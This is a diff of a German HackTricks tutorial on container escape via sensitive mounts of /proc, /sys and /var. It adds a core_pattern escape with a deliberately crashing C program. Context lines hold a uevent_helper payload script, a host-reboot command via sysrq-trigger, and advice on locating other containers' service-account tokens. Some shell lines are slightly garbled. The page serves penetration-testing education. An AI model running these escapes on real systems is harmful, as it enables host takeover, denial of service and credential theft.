@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Die Exposition von `/proc`, `/sys` und `/var` ohne angemessene Namensraum-Isolierung führt zu erheblichen Sicherheitsrisiken, einschließlich einer Vergrößerung der Angriffsfläche und Informationsoffenlegung. Diese Verzeichnisse enthalten sensible Dateien, die, wenn sie falsch konfiguriert oder von einem unbefugten Benutzer zugegriffen werden, zu einem Container-Ausbruch, Host-Modifikation oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Zum Beispiel kann das falsche Einbinden von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierten Natur umgehen und `/host/proc` ungeschützt lassen.
+Die Offenlegung von `/proc`, `/sys` und `/var` ohne angemessene Namensraum-Isolierung bringt erhebliche Sicherheitsrisiken mit sich, einschließlich einer Vergrößerung der Angriffsfläche und der Offenlegung von Informationen. Diese Verzeichnisse enthalten sensible Dateien, die, wenn sie falsch konfiguriert oder von einem unbefugten Benutzer zugegriffen werden, zu einem Container-Ausbruch, einer Host-Modifikation oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Zum Beispiel kann das falsche Einhängen von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierten Natur umgehen und `/host/proc` ungeschützt lassen.
 
 **Weitere Details zu jeder potenziellen Schwachstelle finden Sie unter** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -15,16 +15,28 @@ Dieses Verzeichnis erlaubt den Zugriff zur Modifikation von Kernel-Variablen, no
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Beschrieben in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Ermöglicht die Definition eines Programms, das bei der Erzeugung von Kernelspeicherabbilddateien ausgeführt wird, wobei die ersten 128 Bytes als Argumente verwendet werden. Dies kann zu einer Codeausführung führen, wenn die Datei mit einer Pipe `|` beginnt.
+- Wenn Sie in diese Datei schreiben können, ist es möglich, eine Pipe `|` gefolgt von dem Pfad zu einem Programm oder Skript zu schreiben, das nach einem Absturz ausgeführt wird.
+- Ein Angreifer kann den Pfad innerhalb des Hosts zu seinem Container ermitteln, indem er `mount` ausführt, und den Pfad zu einer Binärdatei im Dateisystem seines Containers schreiben. Dann kann er ein Programm zum Absturz bringen, um den Kernel dazu zu bringen, die Binärdatei außerhalb des Containers auszuführen.
+
 - **Test- und Ausbeutungsbeispiel**:
-
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test auf Schreibzugriff
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Benutzerdefinierten Handler festlegen
-sleep 5 && ./crash & # Handler auslösen
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+Überprüfen Sie [diesen Beitrag](https://pwning.systems/posts/escaping-containers-for-fun/) für weitere Informationen.
 
+Beispielprogramm, das abstürzt:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
 - Detailliert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -32,28 +44,28 @@ sleep 5 && ./crash & # Handler auslösen
 - **Zugriffsprüfung Beispiel**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
+ls -l $(cat /proc/sys/kernel/modprobe) # Überprüfen des Zugriffs auf modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
 - Referenziert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Ein globales Flag, das steuert, ob der Kernel bei einem OOM-Zustand einen Panic auslöst oder den OOM-Killer aufruft.
+- Ein globales Flag, das steuert, ob der Kernel panikt oder den OOM-Killer aufruft, wenn eine OOM-Bedingung auftritt.
 
 #### **`/proc/sys/fs`**
 
-- Laut [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) enthält es Optionen und Informationen über das Dateisystem.
+- Laut [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) enthält Optionen und Informationen über das Dateisystem.
 - Schreibzugriff kann verschiedene Denial-of-Service-Angriffe gegen den Host ermöglichen.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Ermöglicht die Registrierung von Interpretern für nicht-native Binärformate basierend auf ihrer Magischen Zahl.
-- Kann zu einer Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
-- Relevante Ausnutzung und Erklärung:
+- Ermöglicht die Registrierung von Interpretern für nicht-native Binärformate basierend auf ihrer Magic-Nummer.
+- Kann zu Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
+- Relevanter Exploit und Erklärung:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Ausführliches Tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### Weitere in `/proc`
+### Andere in `/proc`
 
 #### **`/proc/config.gz`**
 
@@ -62,7 +74,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
 
 #### **`/proc/sysrq-trigger`**
 
-- Ermöglicht das Auslösen von Sysrq-Befehlen, was möglicherweise sofortige Systemneustarts oder andere kritische Aktionen verursacht.
+- Ermöglicht das Auslösen von Sysrq-Befehlen, was sofortige Systemneustarts oder andere kritische Aktionen verursachen kann.
 - **Beispiel für Neustart des Hosts**:
 
 ```bash
@@ -71,13 +83,13 @@ echo b > /proc/sysrq-trigger # Neustart des Hosts
 
 #### **`/proc/kmsg`**
 
-- Gibt Nachrichten des Kernel-Ringpuffers aus.
-- Kann bei Kernel-Ausnutzungen, Adresslecks helfen und sensible Systeminformationen bereitstellen.
+- Gibt Nachrichten aus dem Kernel-Ringpuffer aus.
+- Kann bei Kernel-Exploits, Adresslecks helfen und sensible Systeminformationen bereitstellen.
 
 #### **`/proc/kallsyms`**
 
 - Listet vom Kernel exportierte Symbole und deren Adressen auf.
-- Essentiell für die Entwicklung von Kernel-Ausnutzungen, insbesondere zum Überwinden von KASLR.
+- Essentiell für die Entwicklung von Kernel-Exploits, insbesondere um KASLR zu überwinden.
 - Adressinformationen sind eingeschränkt, wenn `kptr_restrict` auf `1` oder `2` gesetzt ist.
 - Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -89,10 +101,10 @@ echo b > /proc/sysrq-trigger # Neustart des Hosts
 
 #### **`/proc/kcore`**
 
-- Stellt den physischen Speicher des Systems im ELF-Kernformat dar.
+- Stellt den physischen Speicher des Systems im ELF-Core-Format dar.
 - Das Lesen kann Inhalte des Host-Systems und anderer Container offenbaren.
 - Große Dateigröße kann zu Leseproblemen oder Softwareabstürzen führen.
-- Ausführliche Nutzung in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- Detaillierte Nutzung in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
@@ -101,8 +113,8 @@ echo b > /proc/sysrq-trigger # Neustart des Hosts
 
 #### **`/proc/mem`**
 
-- Alternative Schnittstelle für `/dev/mem`, die physischen Speicher darstellt.
-- Ermöglicht das Lesen und Schreiben, die Modifikation des gesamten Speichers erfordert die Auflösung von virtuellen zu physischen Adressen.
+- Alternative Schnittstelle für `/dev/mem`, die den physischen Speicher darstellt.
+- Ermöglicht das Lesen und Schreiben, die Modifikation des gesamten Speichers erfordert die Auflösung virtueller in physische Adressen.
 
 #### **`/proc/sched_debug`**
 
@@ -111,26 +123,26 @@ echo b > /proc/sysrq-trigger # Neustart des Hosts
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Bietet Informationen über Einhängepunkte im Namensraum des Prozesses.
-- Gibt den Standort des Container `rootfs` oder Images preis.
+- Bietet Informationen über Einhängepunkte im Mount-Namensraum des Prozesses.
+- Gibt den Standort des Container-`rootfs` oder Images preis.
 
 ### `/sys` Schwachstellen
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Wird zur Handhabung von Kernel-Gerät `uevents` verwendet.
-- Das Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösungen ausführen.
+- Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösungen ausführen.
 - **Beispiel für Ausnutzung**: %%%bash
 
 #### Erstellt eine Payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Findet den Host-Pfad vom OverlayFS-Mount für den Container
+#### Findet den Host-Pfad von OverlayFS-Mount für den Container
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Setzt uevent_helper auf schädlichen Helper
+#### Setzt uevent_helper auf bösartigen Helper
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -144,16 +156,16 @@ cat /output %%%
 
 #### **`/sys/class/thermal`**
 
-- Steuert Temperatureinstellungen, was möglicherweise DoS-Angriffe oder physische Schäden verursachen kann.
+- Steuert Temperatureinstellungen, was potenziell DoS-Angriffe oder physische Schäden verursachen kann.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Leaks Kernel-Adressen, was möglicherweise KASLR gefährdet.
+- Leckt Kernel-Adressen, was KASLR gefährden kann.
 
 #### **`/sys/kernel/security`**
 
 - Beherbergt die `securityfs`-Schnittstelle, die die Konfiguration von Linux-Sicherheitsmodulen wie AppArmor ermöglicht.
-- Der Zugriff könnte es einem Container ermöglichen, sein MAC-System zu deaktivieren.
+- Zugriff könnte es einem Container ermöglichen, sein MAC-System zu deaktivieren.
 
 #### **`/sys/firmware/efi/vars` und `/sys/firmware/efi/efivars`**
 
@@ -167,7 +179,7 @@ cat /output %%%
 
 ### `/var` Schwachstellen
 
-Der **/var**-Ordner des Hosts enthält Container-Runtime-Sockets und die Dateisysteme der Container. Wenn dieser Ordner innerhalb eines Containers eingebunden ist, erhält dieser Container Lese- und Schreibzugriff auf die Dateisysteme anderer Container mit Root-Rechten. Dies kann missbraucht werden, um zwischen Containern zu pivotieren, um einen Denial-of-Service zu verursachen oder um andere Container und Anwendungen, die darin ausgeführt werden, zu hintertüren.
+Der **/var**-Ordner des Hosts enthält Container-Laufzeitsockets und die Dateisysteme der Container. Wenn dieser Ordner innerhalb eines Containers gemountet ist, erhält dieser Container Lese- und Schreibzugriff auf die Dateisysteme anderer Container mit Root-Rechten. Dies kann missbraucht werden, um zwischen Containern zu pivotieren, um einen Denial-of-Service zu verursachen oder um andere Container und Anwendungen, die in ihnen laufen, zu backdooren.
 
 #### Kubernetes
 
@@ -253,7 +265,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Hinweis
 
-Die tatsächlichen Pfade können in verschiedenen Setups abweichen, weshalb es am besten ist, den **find**-Befehl zu verwenden, um die Dateisysteme der anderen Container und die SA / Web-Identitätstoken zu lokalisieren.
+Die tatsächlichen Pfade können in verschiedenen Setups abweichen, weshalb es am besten ist, den **find**-Befehl zu verwenden, um die Dateisysteme der anderen Container und SA / Web-Identitätstoken zu lokalisieren.
 
 ### Referenzen
 
